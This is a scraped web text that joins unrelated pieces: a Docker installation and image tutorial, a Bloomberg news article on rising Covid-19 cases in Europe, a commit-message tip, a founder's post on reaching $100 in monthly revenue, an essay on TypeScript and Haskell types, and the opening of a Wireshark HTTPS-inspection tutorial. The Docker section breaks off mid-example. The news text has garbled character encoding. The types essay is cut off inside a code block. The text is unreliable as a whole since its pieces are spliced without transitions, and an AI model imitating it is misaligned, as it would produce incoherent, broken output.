<p>The Linux version is the easiest to install, given that Docker is built off of Linux utilities. On Mac and Windows, on the other hand, there are two main ways of using Docker:</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://docs.docker.com/desktop/">Docker Desktop</a>
The newer and recommended version of Docker. It is a native solution that works directly along with your OS's processes, so we are free to interface with Docker with your favorite terminal and your favorite IDE/text editors.</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.docker.com/toolbox/overview/">Docker Toolbox</a>
This is an old version for machines that don't meet the minimum requirements for Docker Desktop. It is not a native solution as it runs on VirtualBox, so we are forced to use the tools that the Toolbox comes packaged with, making everything more cumbersome and prone to errors.</p>
</li>
</ul>
<p>The main catch is that Docker Desktop is not easy to install on every system. While it is straightforward on macOS 10.13+ and Windows 10 Pro, the Windows 10 Home version needs extra attention.</p>
<p>Docker Desktop on Windows leverages Hyper-V, which is Microsoft's Type 1 hypervisor and only available on Windows 10 Pro, Enterprise, and Education. Fortunately, Windows Home supports <strong>Windows Subsystem for Linux</strong> (WSL), a Linux kernel developed by Microsoft that allows us to run Linux processes to run natively without emulation. Since March 2020, Docker Desktop supports WSL version 2 as a backend on Windows Home.</p>
<p>To install Docker Desktop on Windows Home we need to install WSL2 first, then install Docker Desktop specifying WSL2 as the backend during the installation process. we can find the whole process to install WSL2 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">here</a> and the subsequent Docker Desktop installation process <a target="_blank" rel="noopener" href="https://docs.docker.com/docker-for-windows/install-windows-home/">here</a>. If you would like to see a walkthrough video of the installation process, let me know and I will work on making one available.</p>
<p>Once installed, we can open our favorite terminal and check that the installation went smoothly by typing</p>
<pre><code>docker --version
</code></pre>
<p>If this returns something the likes of</p>
<pre><code>Docker version 19.03.12, build 48a66213fe
</code></pre>
<p>we are good to go!</p>
<p><strong>Note</strong>: In case you are unable to make it work on your machine or if you don't want to install anything yet, Docker also offers <a target="_blank" rel="noopener" href="https://www.docker.com/play-with-docker">online playgrounds</a> to run your code and everything you find in this tutorial would work the same.</p>
<h2 id="let-s-run-our-first-container-">Let's run our first container!</h2>
<p>As we saw last week, to run a container we first need to find an image on the Docker registry. Like everything in the programming, Docker has a Hello World container that we can easily get from its Docker Hub <a target="_blank" rel="noopener" href="https://hub.docker.com/_/hello-world">page</a>. As we can see on the website, the command we have to run is</p>
<pre><code>$ docker pull hello-world
</code></pre>
<p>which will welcome us with an unsightly wall of output which looks like</p>
<pre><code>Using default tag: latest
latest: Pulling from library/hello-world
0e03bdcc26d7: Pulling fs layer
0e03bdcc26d7: Verifying Checksum
0e03bdcc26d7: Download complete
0e03bdcc26d7: Pull complete
Digest: sha256:49a1c8800c94df04e9658809b006fd8a686cab8028d33cfba2cc049724254202
Status: Downloaded newer image for hello-world:latest
docker.io/library/hello-world:latest
</code></pre>
<p>We can see a few things that we need to cover, namely <strong>tags</strong> and <strong>layers</strong>.</p>
<p>We can check all the images that we have in our machine simply by running <code>$ docker images</code> and inspecting its output:</p>
<pre><code>REPOSITORY       TAG        IMAGE ID        CREATED           SIZE
hello-world      latest     bf756fb1ae65    7 months ago      13.3kB
</code></pre>
<p>We can see that we have a <code>hello-world</code> image tagged latest, with a unique image ID (yours may be different) and it weighs only 13.3KB! That is where the gold is! Running a similar basic job using a VM would entail installing an entire OS just to output "Hello world!".</p>
<p>The first column of the <code>docker images</code> output is called <strong>repository</strong>. If you have ever used Git or GitHub, the name might sound familiar. In a Docker Registry, a repository is a collection of different versions of images that share the same base name. Each of the versions is identified by a <strong>tag</strong>, but images can have multiple tags as well!</p>
<p>In general, Docker images follow the naming convention of <code>username/repository:tag</code>. As a quick example, let's suppose that I built an image called <code>mysimpleapp</code> and I shared version 1.0 on the Docker Hub. You could get that image by running</p>
<pre><code>$ docker pull antoniolofiego/mysimpleapplication:1.0
</code></pre>
<p>If we do not specify the tag portion, Docker will by default download the image that is tagged as <code>latest</code>. This is not a special tag, but just the one that Docker assigns by default to images when no other tags are specified at build time.</p>
<p>Now that we have the image locally, we want to run it, right? Surely enough, the command to run images is <code>$ docker run &lt;image&gt;</code>. There are mainly three ways to reference an image:</p>
<ul>
<li><strong>By repository</strong>, but it works only if we have a single version of the image (ex: if I have two versions from the same repository, Docker will be confused about which I am referring to).</li>
<li><strong>By repository/tag combination</strong>, which solves the previous problem.</li>
<li><strong>By image ID</strong>, the preferred way, given that every image will always have a unique ID. Note, we can use just the first few characters from the ID and Docker will pick up the correct one.</li>
</ul>
<p>Using the Image ID method, for our <code>hello-world</code> image example we will run</p>
<pre><code>$ docker run bf756
Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image that runs the executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

 https://docs.docker.com/get-started/
</code></pre>
<p>We have successfully pulled and run our first Docker Image! 🎉 Let's recap all we learned so far by visualizing a repository structure and all the ways to pull or run an image in a simple way</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1596760605560/zssexvySE.png?auto=format&amp;q=60" alt="Repo structure"></p>
<p>We know how to pull and run simple images! We just scratched the Docker surface, however. Are you ready to go to the next level?</p>
<p><img src="https://miro.medium.com/max/570/0*y8AuUHSoTGRqX40h.jpeg" alt="We need to go deeper!"></p>
<h2 id="breaking-down-a-docker-image">Breaking down a Docker Image</h2>
<p>We know from last week that a Docker Image starts as a Dockerfile, which is a recipe that Docker follows to package our application. It is composed of a series of <code>[action]</code> <code>[target]</code> commands, each of which specifies a command that Docker needs to run in sequential order.</p>
<p>Let's take a look at a Dockerfile that deploys a simple Node.js Express server and try to understand how it works.</p>
<p><strong>Note:</strong> You can download all the code from this example via <a target="_blank" rel="noopener" href="https://github.com/antoniolofiego/hashnode-dockerseries-expressapp">this</a> GitHub repository.</p>
<p>The folder structure for this example is as follows</p>
<pre><code>📦docker-express-app
 ┣ 📂src
 ┃ ┗ 📜server.js
 ┣ 📜.gitignore
 ┣ 📜Dockerfile
 ┣ 📜package-lock.json
 ┗ 📜package.json
</code></pre>
<p>As we can see, the Dockerfile sits at the root level of my project folder. Let's now look at its content.</p>
<pre><code>FROM node:11-alpine

RUN mkdir app

WORKDIR /app

COPY . .

RUN npm install

CMD ["npm", "run", "start"]
</code></pre>
<p>Let's go through each step one by one:</p>
<ol>
<li><p><code>FROM node:11-alpine</code> tells Docker to download the Docker image for Node.js version 11 running on Linux Alpine, a very lightweight Linux distribution. This will be the base image used by our container.</p>
</li>
<li><p><code>RUN mkdir app</code> creates a local folder named <code>app</code> at the root of the environment.</p>
</li>
<li><p><code>WORKDIR /app</code> changes the working directory for all subsequent commands to the <code>/app</code> folder that we created in step 2.</p>
</li>
<li><p><code>COPY . .</code> tells Docker to copy all the files in the current folder on my machine (my <code>docker-express-app</code> folder) in the current directory of the Docker image (the <code>/app</code> directory).</p>
</li>
<li><p><code>RUN npm install</code> installs all the dependencies that I specified in my <code>package.json</code> file, in this case only <code>express</code>.</p>
</li>
<li><p><code>CMD ["npm", "run", "start"]</code> is the command that the container will run at instantiation time, in this case, the <code>start</code> script defined in <code>package.json</code>.</p>
</li>
</ol>
<p>The next step is to build the image. As you can imagine, we have a <code>docker build</code> command that does just that! The standard usage for the build command is</p>
<pre><code>docker build -t &lt;username/repository:tag&gt; &lt;path/to/Dockerfile&gt;
</code></pre>
<p>Remember that, when tagging an image, if we only provide a repository name Docker will assign the <code>latest</code> tag to the image by default. Let's take a look at the output.</p>
<pre><code>$ docker build -t docker-express-app .

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>(Bloomberg) -- If this summer was supposed to offer hope that coronavirus was under control in Europe, spikes in cases across the continent and ensuing travel chaos have given governments a worrying reality check.</p><p>From France down to Ukraine, the number of positive tests for Covid-19 is rising sharply as more people seek vacations and after lockdown measures were eased to allow citizens to congregate. Germany reported the most new cases since May, while France said the situation is worsening, particularly in the cities of Paris and Marseille.</p><p>The British government added France and the Netherlands to a list of countries from where people must quarantine for 14 days on arrival in the U.K. Travel stocks slumped. In Eastern Europe, which had been hit less hard by the pandemic, some countries approached near record number of daily cases.</p><p>French Health Agency chief Jerome Salomon said large family reunions, such as weddings, and work places are prevalent places of infection. â€œOne can only be worried as hundreds of new people are hospitalized,â€� Salomon told France Inter. He urged people to socially distance to avoid the crisis of March and April that â€œno one wants to go through again.â€�</p><p>It was always going to be a gamble as countries sought to open up their economies in an attempt to mitigate the unfolding financial collapse. Closing businesses and ordering people to stay at home again is something political leaders remain reluctant to do given the dark economic forecast and millions of jobs at risk, particularly in tourism.</p><p>Spanish Warning</p><p>As infections continued to rise in Spain, the main business lobby on Thursday warned that any second lockdown would have catastrophic consequences and urged the government to promote the use of a new app developed by the Economy Ministry to trace cases of Covid-19. New cases in Spain jumped to the highest since at least May 25, when the government changed its methodology for reporting data.</p><p>In the U.K., Prime Minister Boris Johnson has been removing lockdown measures, though he has been concerned not to trigger a second wave of cases from arrivals from abroad. His government already faces an inquiry into its handling of the crisis after Britain recorded Europeâ€™s highest death toll.</p><p>Hundreds of thousands of British tourists now face being forced to quarantine on their return home after the government added France, the Netherlands and Malta to its list of virus trouble-spot destinations.</p><p>The new rules, which come into force from 4 a.m. on Saturday, are likely to spark a chaotic scramble for tickets on flights, trains and car ferries for 160,000 Britons currently holidaying in France. The French government said the decision was regrettable and warned it would lead to reciprocal action.</p><p>â€œThe biggest priority has to be to protect our hard-won gains in getting the virus under control and not re-importing it as people return home,â€� U.K. Transport Secretary Grant Shapps told Times Radio on Friday. â€œItâ€™s a public health issue we simply canâ€™t turn our backs on.â€�</p><p>â€˜Calculated Riskâ€™</p><p>Back in June, Greek Prime Minister Kyriakos Mitsotakis spoke of how he was taking a â€œcalculated riskâ€� to allow foreign visitors to return to the countryâ€™s beaches and resorts.</p><p>After a jump in cases, he urged young people to be cautious and said additional protection measures will be announced, the ANA news agency reported. He also requested those returning from vacations to be cautious for a week at least.</p><p>There has been concern in Greece and Croatia, two countries in the European Union that rely most on tourism, that the virus is being imported by visitors. Croatia recorded 150 new coronavirus cases on Thursday, the most so far, with the expectation of a record on Friday. Meanwhile, Austria warned against travel to Croatia, a major holiday destination and home country of many Austrian immigrants, effective Aug. 17.</p><p>Indeed, the east of the continent is seeing rising number of Covid-19 cases in recent days, especially in Ukraine and Romania. On Friday, Ukraine reported a record-high daily number of new infections for the sixth time this month.</p><p>Romania reported its second-highest daily number of cases since the start of the pandemic. The nation with the highest death toll in eastern Europe also reported 44 deaths on Friday, after hitting a record on Thursday.</p><p>Poland, whose population of 38 million is almost twice as large as that of Romania, is also seeing the rise in infections, with 832 cases on Friday being the second-highest daily number. The Health Ministry mostly blames weddings for the rebound in cases.</p><p>Â©2020 Bloomberg L.P.</p></div></div>]]>

        <p>Writing good commit messages can save you a lot of time. In this blog post I
want to show you an example of that. At some point in the past I changed the
colours of the links on this blog from grey to blue, but where did I make
this change again? Commit messages to the rescue!</p>

<p><img src="https://www.janmeppe.com/assets/2020-07-10-good-commit-messages/img.png"></p>

<p>I was unable to recall where in the code I made the changes by browsing
through the files so I went over my commit history and… lo and behold.</p>

<p><img src="https://www.janmeppe.com/assets/2020-07-10-good-commit-messages/commit.png"></p>

<p>Thank you, past me, for writing these awesome commit messages!</p>

<h2 id="how-to-write-good-commit-messages">How to write good commit messages</h2>

<p>Writing good commit messages is a tricky thing and there are a
<a href="https://chris.beams.io/posts/git-commit/">lot</a> of
<a href="https://www.freecodecamp.org/news/writing-good-commit-messages-a-practical-guide/">different</a>
opinion on <a href="https://github.com/erlang/otp/wiki/writing-good-commit-message">this</a>.</p>

<p>What I like to do is follow a rule that I picked up somewhere. Sadly, I can’t
find the source for this but it has served me well. The rule is as follows. When you write a commit messages you think to yourself</p>

<blockquote>
  <p><em>When applied, this commit will…</em></p>
</blockquote>

<p>Here it is applied in action:</p>

<ul>
  <li>When applied this commit will <strong>makes links blue</strong></li>
  <li>When applied this commit will <strong>add logos and splash image</strong></li>
  <li>When applied this commit will <strong>add splash post, leetcode post, update tags</strong></li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>I never thought that my commit habits would save me this much time, but here we are. To summarize, to write good commit messages simply think to yourself:</p>

  <p>August 14, 2020 | <span>7</span> Minute Read</p>
  
  <p>TLDR - Quite a lot!</p>

<p>I have reached my first goal with <a href="https://supportman.io/">Supportman</a> of $100 MRR (monthly recurring revenue)! I picked this number because at $100, <a href="https://supportman.io/">Supportman</a> would be profitable, as well as make enough money to pay for my wife and I’s weekly coffee dates.</p>

<p>I knew it would be tough to get my first paying customers, but I didn’t know it would be this hard! When you’re dreaming about starting a business, it can be difficult to forsee all the work and effort that will go into it. I wanted to share my experience so you could see an example of what it could take to reach $100 MRR.</p>

<h3 id="time">Time</h3>

<center><img src="https://media.giphy.com/media/jls5k3a7L1N0XRM9d0/giphy.gif" width="30%"></center>

<p>I started Supportman on January 1st, 2020. At that point, I started doing customer discovery and talking to people in the support industry.</p>

<p>I made the first commit for the project on March 27th and then I launched the product on June 12. It wasn’t until August 7th that I had reached $100 MRR.</p>

<p>So it took a little over three months to create the MVP. And it took just about two months to reach $100 MRR after launch. It took 7.5 months in total.</p>

<p>That’s a long time! Or at least it feels longer than what I was expecting. $100 really isn’t that much, but it definitely is a start!</p>

<p>I should also mention that I have been working on Supportman on the side while maintaining my full-time job. I probably spend somewhere from 10 to 20 hours per week, but that can vary some from week to week.</p>

<p>Remember, not every founder has the same experience and yours will most likely be different. Some markets are faster to get going and it will definitely vary widely depending on if you are doing B2B or consumer.</p>

<h3 id="selling-to-customers-and-building-rapport">Selling To Customers and Building Rapport</h3>

<center><img src="https://media.giphy.com/media/6o0jq0G2tfv7W/giphy.gif" width="40%"></center>

<p>Like most software developers, this is my least favorite part - selling to potential customers. I did quite a lot of direct sales.</p>

<p>It takes so much time to find potential customers, research them on LinkedIn, find their email address, and then message them a handcrafted, personal email.</p>

<p>One of the ways that I found lots of my potential customers was by being in customer support slack communities. I DM’ed quite a few people in these groups.</p>

<p>Overall I probably private messaged/emailed around 120 potential customers. Some of those ended up being helpful conversations to learn more and some just flat out said no. Of course, the large majority didn’t reply at all.</p>

<p>Out of all of that grueling time-consuming work, only one of my current paying customers came from a cold slack DM.</p>

<p>I knew sales would be hard but I didn’t know it would be this hard!</p>

<p>I think the other part of the pie in sales is building rapport. If I am a person that people trust in the customer support community, they are going to be more willing to chat with me.</p>

<p>I can see how entrepreneurs who have grown a big audience or network in their industry would really have an upper hand here. They could get off to a much quicker start.</p>

<p>On the other hand - I am starting my customer support relationships from zero. And it is a lot of work! I was able to start with some of the companies that I did customer discovery with but none of them ended up converting to paid customers.</p>

<p>I have a lot more work to do in regards to building rapport and I have some ideas to do this in the future. I think the bottom line is, be helpful to the communities your customers are in and you will start to be seen as an expert in the space.</p>

<h3 id="intercom-app-store">Intercom App Store</h3>

<center><img src="https://media.giphy.com/media/IffZTS1F0nR0T7PMgd/giphy.gif" width="40%"></center>

<p>The <a href="https://www.intercom.com/app-store">Intercom app store</a> was what I had hoped would be my main distribution channel. This was one of my reasons for wanting to create a <a href="https://noahbragg.com/blog/why-im-building-a-side-dish/">Side Dish</a>. I had hoped that I could build an app on a platform and that platform could bring me most of my leads.</p>

<p>So far this hasn’t really been the case. I have probably been getting about two sign ups a week from Intercom. And that is even with Supportman getting into the Intercom <a href="https://www.intercom.com/app-store/?category=new-and-noteworthy">New and Noteworthy</a> category. This is a category that shows Supportman on the front page of the app store!</p>

<p>There could be other problems causing this. It could mean that the problem I am solving or how I am showing it in my listing isn’t resonating with Intercom companies. Another problem is that it’s really hard to tell how many people are coming across my listing since Intercom doesn’t have any analytics.</p>

<p>So that being said, there is still a lot of work for me to do to figure the Intercom app store out and optimize it to help me find customers.</p>

<h3 id="twitter">Twitter</h3>

<center><img src="https://media.giphy.com/media/YAGcqpFNT5DXO/giphy.gif" width="50%"></center>

<p>So, where did my first customers come from then? As I mentioned already, one was from cold messaging. The other three came from Twitter!</p>

<p>I created a <a href="https://twitter.com/supportmanHQ">Supportman Twitter account</a> and started tweeting updates that I had made to the app. I also tried to create some value for Intercom customers by writing a couple of <a href="https://supportman.io/blog">how to blog posts</a>.</p>

<p>Every time that I made a new tweet, I would mention Intercom. A couple of these they liked and a couple of them they retweeted. Intercom customers saw the tweets and checked out Supportman.</p>

<p>This was great! There is definitely more I can do on Twitter to help push engagement and ultimately push users to Supportman. But again, creating valuable content takes time.</p>

<h3 id="building-more-features">Building More Features</h3>

<center><img src="https://media.giphy.com/media/hrRJ41JB2zlgZiYcCw/giphy.gif" width="40%"></center>

<p>I started Supportman out as a pretty basic MVP. It was very minimal. It could just send Intercom conversation ratings to a Slack channel and a weekly report of the metrics support teams care about. I thought this was all I would need to get started but I was only partially right. Some of my customers just wanted those features, but just about everyone started to ask for more.</p>

<p>They also wanted more preferences around the features I had already created. I pretty quickly learned that I needed to make these changes and add them to get my first paying customers.</p>

<p>It looked something like this… a customer would ask for something to be added and then I would do it and have it ready for them a day later. This allowed me to blow them away by my fast response times which helped convert them to paying customers.</p>

<p>That being said, I had to build more features and update my existing MVP more than I would have expected in the beginning. This is all good though since it is helping to make my product even better and push it in the right direction.</p>

<h3 id="conclusion">Conclusion</h3>

<p>You can probably already tell the conclusion and theme that I am pushing in this post. Building a SaaS business takes a lot of time and it is really hard to get to even something as little as $100 MRR! It was a lot harder than I expected.</p>

<p>But at the same time, I am excited that I have made it this far and feel like there is hope for Supportman in the future.</p>

<p>Just getting one paying customer is a pretty big deal because it means you have created something valuable for someone else.</p>

<p>Hopefully this gives you a glimpse of what it could take for you to reach this milestone as well!</p>

<h3 id="support">Support</h3>

<p>I hope this was helpful in some way. If you liked it, sharing the thread on Twitter is really appreciated!</p>

<p>Just what exactly <em>is</em> a type?</p>

<p>A common perspective is that types are <em>restrictions</em>. Static types restrict the set of values a variable may contain, capturing some subset of the space of “all possible values.” Under this worldview, a typechecker is sort of like an oracle, predicting which values will end up where when the program runs and making sure they satisfy the constraints the programmer wrote down in the type annotations. Of course, the typechecker can’t <em>really</em> predict the future, so when the typechecker gets it wrong—it can’t “figure out” what a value will be—static types can feel like self-inflicted shackles.</p>

<p>But that is not the <em>only</em> perspective. There is another way—a way that puts you, the programmer, back in the driver’s seat. You make the rules, you call the shots, you set the objectives. You need not be limited any longer by what the designers of your programming language decided the typechecker can and cannot prove. You do not serve the typechecker; the typechecker serves <em>you.</em></p>

<p>…no, I’m not trying to sell you a dubious self-help book for programmers who feel like they’ve lost control of their lives. If the above sounds too good to be true, well… I won’t pretend it’s all actually as easy as I make it sound. Nevertheless, it’s well within the reach of the working programmer, and most remarkably, all it takes is a change in perspective.</p>
<!-- more-->



<p>Let’s talk a little about TypeScript.</p>

<p>TypeScript is a <em>gradually-typed</em> language, which means it’s possible to mix statically- and dynamically-typed code. The original intended use case of gradual typing was to <em>gradually</em> add static types to an existing dynamically-typed codebase, which imposes some interesting design constraints. For one, a valid JavaScript program must also be a valid TypeScript program; for another, TypeScript must be accommodating of traditional JavaScript idioms.</p>

<p>Gradually typed languages like TypeScript are particularly good illustrations of the way type annotations can be viewed as constraints. A function with no explicit type declarations<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-1-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-1-return">1</a></sup> can accept <em>any</em> JavaScript value, so adding a type annotation fundamentally restricts the set of legal values.</p>

<p>Furthermore, languages like TypeScript tend to have subtyping. This makes it easy to classify certain types as “more restrictive” than others. For example, a type like <code>string | number</code> clearly includes more values than just <code>number</code>, so <code>number</code> is a more restrictive type—a <em>subtype</em>.</p>

<p>An exceptionally concrete way to illustrate this “types are restrictions” mentality is to write a function with an unnecessarily specific type. Here’s a TypeScript function that returns the first element in an array of numbers:</p>

<div>
 <div>
  <pre><span></span><span>function</span> <span>getFirst</span><span>(</span><span>arr</span>: <span>number</span><span>[])</span><span>:</span> <span>number</span> <span>|</span> <span>undefined</span> <span>{</span>
  <span>return</span> <span>arr</span><span>[</span><span>0</span><span>];</span>
<span>}</span>
</pre></div>

</div>

<p>This function would work perfectly well given a list of strings, but if you write <code>getFirst(["hello", "world"])</code>, the typechecker will complain. Of course, in this example the restriction is thoroughly self-imposed—it would be easy to give this function a generic type—but sometimes it’s not quite so easy. For example, suppose we write a function where the return type depends upon the type of the argument:</p>

<div>
 <div>
  <pre><span></span><span>function</span> <span>emptyLike</span><span>(</span><span>val</span>: <span>number</span> <span>|</span> <span>string</span><span>)</span><span>:</span> <span>number</span> <span>|</span> <span>string</span> <span>{</span>
  <span>if</span> <span>(</span><span>typeof</span> <span>val</span> <span>===</span> <span>"number"</span><span>)</span> <span>{</span>
    <span>return</span> <span>0</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> <span>""</span><span>;</span>
  <span>}</span>
<span>}</span>
</pre></div>

</div>

<p>Now if we write <code>emptyLike(42) * 10</code>, the typechecker will once again complain, claiming the result could be a string—it can’t “figure out” that when we pass a number, we always get a number back.</p>

<p>When type systems are approached from this perspective, the result is often frustration. The programmer knows that the equivalent untyped JavaScript is perfectly well-behaved, so the typechecker comes off as being the highly unfortunate combination of stubborn yet dim-witted. What’s more, the programmer likely has little mental model of the typechecker’s internal operation, so when types like the above are inferred (not explicitly written), it can be unclear what solutions exist to make the error go away.</p>

<p>At this point, the programmer may give up. “Stupid typechecker,” they grumble, changing the return type of <code>emptyLike</code> to <code>any</code>. “If it can’t even figure this out, can it <em>really</em> be all that useful?”</p>

<p>Sadly, this relationship with the typechecker is all too common, and gradually-typed languages in particular tend to create a vicious cycle of frustration:</p>

<ul>
 <li>
  <p>Gradual type systems are intentionally designed to “just work” on idiomatic code as much as possible, so programmers may not think much about the types except when they get type errors.</p></li>
 <li>
  <p>Furthermore, many programmers using gradually-typed languages are already adept at programming in the underlying dynamically-typed language, so they have working mental models of program operation in terms of the dynamic semantics alone. They are much less likely to develop a rich mental model of the static semantics of the type system because they are used to reasoning without one.</p></li>
 <li>
  <p>Gradually typed languages must support idioms from their dynamically-typed heritage, so they often include ad-hoc special cases (such as, for example, special treatment of <code>typeof</code> checks) that obscure the rules the typechecker follows and make them seem semi-magical.</p></li>
 <li>
  <p>Builtin types are deeply blessed in the type system, strongly encouraging programmers to embrace their full flexibility, but leaving little recourse when they run up against their limits.</p></li>
 <li>
  <p>All this frustration breeds a readiness to override the typechecker using casts or <code>any</code>, which ultimately creates a self-fulfilling prophecy in which the typechecker rarely catches any interesting mistakes because it has been so routinely disabled.</p></li></ul>

<p>The end result of all of this is a defeatist attitude that views the typechecker as a minor tooling convenience at best (i.e. a fancy autocomplete provider) or an active impediment at worst. Who can really blame them? The type system has (unintentionally of course) been designed in such a way so as to lead them into this dead end. The public perception of type systems settles into that of a strikingly literal nitpicker we endure rather than as a tool we actively leverage.</p>



<p>After everything I said above, it may be hard to imagine seeing types any other way. Indeed, through the lens of TypeScript, the “types are restrictions” mentality is incredibly natural, so much so that it seems self-evident. But let’s move away from TypeScript for a moment and focus on a different language, Haskell, which encourages a somewhat different perspective. If you aren’t familiar with Haskell, that’s alright—I’m going to try to keep the examples in this blog post as accessible as possible whether you’ve written any Haskell or not.</p>

<p>Though Haskell and TypeScript are both statically-typed—and both of their type systems are fairly sophisticated—Haskell’s type system is almost completely different philosophically:</p>

<ul>
 <li>
  <p>Haskell does not have subtyping,<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-2-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-2-return">2</a></sup> which means that every value belongs to exactly one type.</p></li>
 <li>
  <p>While JavaScript is built around a small handful of flexible builtin datatypes (booleans, numbers, strings, arrays, and objects), Haskell has essentially no blessed, built-in datatypes other than numbers. Key types such as booleans, lists, and tuples are ordinary datatypes defined in the standard library, no different from types users could define.<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-3-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-3-return">3</a></sup></p></li>
 <li>
  <p>In particular, Haskell is built around the idea that datatypes can be defined with multiple <em>cases</em>, and branching is done via pattern-matching (more on this shortly).</p></li></ul>

<p>Let’s look at a basic Haskell datatype declaration. Suppose we want to define a type that represents a season:</p>

<div>
 <div>
  <pre><span></span><span>data</span> <span>Season</span> <span>=</span> <span>Spring</span> <span>|</span> <span>Summer</span> <span>|</span> <span>Fall</span> <span>|</span> <span>Winter</span>
</pre></div>

</div>

<p>If you are familiar with TypeScript, this may look rather similar to a union type; if you’re familiar with a C-family language, this may remind you more of an enum. Both are on the right track: this defines a new type named <code>Season</code> with four possible values, <code>Spring</code>, <code>Summer</code>, <code>Fall</code>, and <code>Winter</code>.</p>

<p>But what exactly <em>are</em> those values?</p>

<ul>
 <li>
  <p>In TypeScript, we’d represent this type with a union of strings, like this:</p>
  <div>
   <div>
    <pre><span></span><span>type</span> <span>Season</span> <span>=</span> <span>"spring"</span> <span>|</span> <span>"summer"</span> <span>|</span> <span>"fall"</span> <span>|</span> <span>"winter"</span><span>;</span>
</pre></div>

</div>
  <p>Here, <code>Season</code> is a type that can be one of those four strings, but nothing else.</p></li>
 <li>
  <p>In C, we’d represent this type with an enum, like this:</p>
  <div>
   <div>
    <pre><span></span><span>enum</span> <span>season</span> <span>{</span> <span>SPRING</span><span>,</span> <span>SUMMER</span><span>,</span> <span>FALL</span><span>,</span> <span>WINTER</span> <span>};</span>
</pre></div>

</div>
  <p>Here, <code>SPRING</code>, <code>SUMMER</code>, <code>FALL</code>, and <code>WINTER</code> are essentially defined to be global aliases for the integers <code>0</code>, <code>1</code>, <code>2</code>, and <code>3</code>, and the type <code>enum season</code> is essentially an alias for <code>int</code>.</p></li></ul>

<p>So in TypeScript, the values are strings, and in C, the values are numbers. What are they in Haskell? Well… they simply <em>are</em>.</p>

<p>The Haskell declaration invents four completely new constants out of thin air, <code>Spring</code>, <code>Summer</code>, <code>Fall</code>, and <code>Winter</code>. They aren’t aliases for numbers, nor are they symbols or strings. The compiler doesn’t expose anything about how it chooses to represent these values at runtime; that’s an implementation detail. In Haskell, <code>Spring</code> is now a value <em>distinct from all other values</em>, even if someone in a different module were to also use the name <code>Spring</code>. Haskell type declarations let us play god, creating something from nothing.</p>

<p>Since these values are totally unique, abstract constants, what can we actually do with them? The answer is one thing and <em>exactly</em> one thing: we can branch on them. For example, we can write a function that takes a <code>Season</code> as an argument and returns whether or not Christmas occurs during it:</p>

<div>
 <div>
  <pre><span></span><span>containsChristmas</span> <span>::</span> <span>Season</span> <span>-&gt;</span> <span>Bool</span>
<span>containsChristmas</span> <span>season</span> <span>=</span> <span>case</span> <span>season</span> <span>of</span>
  <span>Spring</span> <span>-&gt;</span> <span>False</span>
  <span>Summer</span> <span>-&gt;</span> <span>True</span>  <span>-- southern hemisphere</span>
  <span>Fall</span>   <span>-&gt;</span> <span>False</span>
  <span>Winter</span> <span>-&gt;</span> <span>True</span>  <span>-- northern hemisphere</span>
</pre></div>

</div>

<p><code>case</code> expressions are, to a first approximation, a lot like C-style <code>switch</code> statements (though they can do a lot more than this simple example suggests). Using <code>case</code>, we can also define conversions from our totally unique <code>Season</code> constants to other types, if we want:</p>

<div>
 <div>
  <pre><span></span><span>seasonToString</span> <span>::</span> <span>Season</span> <span>-&gt;</span> <span>S…</span></pre></div></div></article></div></section></div>

<p>This post will teach you <strong>how to see HTTPS in-action</strong>, but not every detail of how HTTPS works. Instead, you’ll gain a <strong>real life example</strong> to reference if you ever want to study the nitty gritty details.</p>

<p>To do this, we’ll learn how to <strong>snoop on our own HTTPS requests via Wireshark</strong> and witness as your computer establishes a secure connection.</p>

<p>Although the nitty gritty details of HTTPS are outside the scope of this post, we’ll <strong>review the basics</strong> before embarking on this exercise to provide a bit of context.</p>

<p>If you’re already familiar with the basics of HTTPS and TLS, feel free to skip to the <a href="#how-to-snoop-on-your-own-requests">next section</a>.</p>



<h2 id="what-is-https">What is HTTPS?</h2>

<p>HTTP stands for <strong>Hypertext Transfer Protocol</strong>. And at the very least, you likely know that whenever you see <code>https://</code> in the address bar, the <strong>S</strong> in <strong>HTTPS</strong> stands for <strong>secure</strong>: ensuring that communication between your browser and the server is secure.</p>

<p>But how does HTTPS secure communication between you and the server? Your browser will perform a <strong>TLS handshake</strong> before sending any sensitive data.</p>

<h2 id="what-is-a-tls-handshake">What is a TLS Handshake?</h2>

<p>At the beginning of any <code>https://</code> request, your browser performs a TLS handshake: a protocol that ensures <strong>confidentiality</strong>, <strong>authentication</strong>, and <strong>integrity</strong> between your computer and the server it talks to.</p>

<p>Today, we’ll focus on confidentiality which promises to <strong>keep your data secret</strong> from snoopers by encrypting your request. To achieve confidentiality, your computer and the server perform a TLS handshake to negotiate the <strong>master secret</strong> used to derive keys that encrypt and decrypt messages sent between each other.</p>

<p>During this exercise, we’ll capture the “secret sauce” used to establish the master secret in order to decrypt our requests!</p>



<h2 id="capture-an-encrypted-request">Capture an Encrypted Request</h2>

<p>Now that we understand the basics of HTTPS and TLS, let’s see it in-action. To do so, we’ll snoop on our own HTTPS request. First, let’s capture a plain ol’ HTTPS request without any clever tricks yet:</p>

<ol>
  <li>Install the latest version of <a href="https://curl.haxx.se/">curl</a>*</li>
  <li>Install and boot up <a href="https://www.wireshark.org/">Wireshark</a></li>
  <li>Type <code>curl https://github.com</code> in the console (but don’t press enter yet!).</li>
  <li>Start a capture via Wireshark</li>
